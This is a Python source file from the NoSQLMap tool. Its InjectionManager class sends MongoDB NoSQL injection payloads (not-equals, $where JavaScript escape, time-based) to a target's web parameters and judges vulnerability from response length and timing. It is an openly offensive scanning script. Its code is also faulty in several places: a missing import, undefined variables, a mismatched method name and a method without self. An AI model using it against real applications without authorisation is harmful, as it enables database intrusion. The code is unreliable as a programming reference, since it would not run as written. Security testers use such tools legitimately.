#!/usr/bin/python
# -*- coding: UTF-8 -*-

#NoSQLMap Copyright 2013 Russell Butturini
#This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.

from log import Logger
import injStrings
import copy

class InjectionManager:
    AvailableTests={
            1: "mongoPHPNotEqualAssociativeArray",
            2: "mongoWhereInjection",
            3: "MongoThisNotEqualEscape", 
            4: "mongoTimeBasedInjection"
            #ADD OTHER TESTS AS SOON AS WE COPY THEM FROM THE MAIN
            }
    randInjDelta = 100

    def __init__(self, connection, standard_length,vulnParam=""):
        self.conn = connection
        self.dictOfParams = connection.payload
        if vulnParam:
            self.testingParams=[vulnParam]
        else:
            self.testingParams = connection.payload
        self.standardLength = standard_length
        self.injStringCreator=injStrings.InjectionStringCreator()
        self.possVuln=[]
        self.sureVuln=[]
        self.successfulAttacks = {} 
    def removeEqual(tup, injParam):
        l=[]
        for el in tup:
            ele = el
            pos=el.find(injParam)
            stLen=len(injParam)
            if pos != -1 and el[pos+stLen]=="=":
                ele = el[:pos+stLen]+el[pos+stLen+1:]
            l.append(ele)
        return l

    def __addSuccessful(self, suc, funcName):
        if suc:
            self.successfulAttacks[funcName]=True
        else:
            self.successfulAttacks[funcName]=False

    def __logResult(self, result):
        if result==-1:
            Logger.error("Injection Failed")
        if result==0:
            Logger.warning("Injection possibly Succeeded")
        else:
            Logger.success("Injection Succeeded")

    def __saveResult(self, result, connParams):
        if result==-1:
            return False
        elif result==0:
            self.possVuln.append(connParams)
            return True
        else:
            self.sureVuln.append(connParams)
            return True


    def __performInjection(self, verificationFunction, injParam="", injectString="", removeEqual=False, dummyInjection=False):
        def removeEqual(tup, injParam):
            l=[]    
            for el in tup:
                ele = el
                pos=el.find(injParam)
                stLen=len(injParam)
                if pos != -1 and el[pos+stLen]=="=":
                    ele = el[:pos+stLen]+el[pos+stLen+1:]
                l.append(ele)
            return l
        tmpDic = copy.deepcopy(self.dictOfParams)
        if not dummyInjection:
            tmpDic[injParam]=injectString
        connParams = self.conn.buildUri(tmpDic)
        if removeEqual:
            connParams = removeEqual(connParams, injParam)
        code, length = self.conn.doConnection(connParams)
        if code != 200: #if no good answer pass to successive test
            return False
        m="Got response length of %s" %(length)
        Logger.info(m)
        result = verificationFunction(length)
        return result,connParams

    def baselineTestEnterRandomString(self, params, injectString):
        '''this function is needed by other functions in order to test things (ex for mongoPHP not equal)'''
        def checkLength(length):
            delta = length - self.standardLength
            self.injectStringLength = length
            if delta == 0:
                return -1
            else:
                return 1

        res, connParams = self.__performInjection(checkLength, params, injectString)
        return res,connParams

    def mongoPHPNotEqualAssociativeArray(self):

        def verifyFunction(length):
            randInjDelta = abs(length - self.injectStringLength)
            if (randInjDelta >= 100) and (length != 0) :
                return 1

            elif (randInjDelta > 0) and (randInjDelta < 100) and (length != 0) :
                return 0
            elif (randInjDelta == 0):
                return -1    
            else:
                return 0
        funcName="mongoPHPNotEqualAssociativeArray"
        Logger.info("Testing Mongo PHP not equals associative array injection")
        cic = False
        for params in self.testingParams:
            for injectString in self.injStringCreator.createIdString():
                injectNeqString = self.injStringCreator.makeNeqString(injectString)
                m="using %s for injection testing" %(injectNeqString)
                Logger.info(m)
                origRes, origConnParams = self.baselineTestEnterRandomString(params, injectString)
                res,connParams=self.__performInjection(verifyFunction, params, injectNeqString, True)
                cic = cic or self.__saveResult(res, connParams)
                self.__logResult(res)
        self.successfulAttacks[funcName]= cic
    def mongoWhereInjection(self):

        def verifyFunction(length):
            randInjDelta = abs(length - self.injectStringLength)
            if (randInjDelta >= 100) and (length != 0) :
                return 1

            elif (randInjDelta > 0) and (randInjDelta < 100) and (length != 0) :
                return 0
            elif (randInjDelta == 0):
                return -1
            else:
                return 0
        funcName="mongoWhereInjection"
        Logger.info("Testing Mongo <2.4 $where all Javascript escape attack")
        cic = False
        for params in self.testingParams:
            for injectString in self.injStringCreator.createIdString():
                for injectWhereString in self.injStringCreator.makeWhereString(injectString):
                    m="using %s for injection testing" %(injectWhereString)
                    Logger.info(m)
                    origRes, origConnParams = self.baselineTestEnterRandomString(params, injectString)
                    res,connParams=self.__performInjection(verifyFunction, params, injectWhereString, False)
                    cic = cic or self.__saveResult(res, connParams)
                    self.__logResult(res)
        self.successfulAttacks[funcName]= cic

    def mongoThisNotEqualEscape(self):

        def verifyFunction(length):
            randInjDelta = abs(length - self.injectStringLength)
            if (randInjDelta >= 100) and (length != 0) :
                return 1

            elif (randInjDelta > 0) and (randInjDelta < 100) and (length != 0) :
                return 0
            elif (randInjDelta == 0):
                return -1
            else:
                return 0
        funcName="MongoThisNotEqualEscape"
        Logger.info("Testing Mongo this not equals escape attack")
        cic = False
        for params in self.testingParams:
            for injectString in self.injStringCreator.createIdString():
                for injectThisString in self.injStringCreator.makeBlindNeqString(injectString):
                    m="using %s for injection testing" %(injectWhereString)
                    Logger.info(m)
                    origRes, origConnParams = self.baselineTestEnterRandomString(params, injectString)
                    res,connParams=self.__performInjection(verifyFunction,params, injectThisString, False)
                    cic = cic or self.__saveResult(res, connParams)
                    self.__logResult(res)
        self.successfulAttacks[funcName]= cic


    def mongoTimeBasedInjection(self):
        #VERY NAIVE IMPLEMENTATION, IMPROVE WITH MORE TESTING
        def dummyF(l):
            return 0
        funcName="mongoTimeBasedInjection"
        Logger.info("Testing time based injection")
        start=time.time()
        res,connParams = self.__performInjection(dummyF, dummyInjection=True)
        end = time.time()
        for params in self.testingParams:
            for injectString in self.injStringCreator.createTimeString():
                startTest = time.time()
                res,connParams=self.__performInjection(dummyF, params, injectString)
                endTest = time.time()
        #TIME TESTING PERFORMED LOCALLY TODO: CREATE AN ABSTRACT FACTORY FOR TET WORKING 
                strTimeDelta = (int(round((end - start), 3)) - timeBase)
                if strTimeDelta > 25:
                    m="HTTP load time variance was %s seconds! Injection succeeded" %(strTimeDelta)
                    Logger.success(m)
                    suc=True
                    self.sureVuln.append(connParams)

        self.__addSuccessful(suc,funcName)
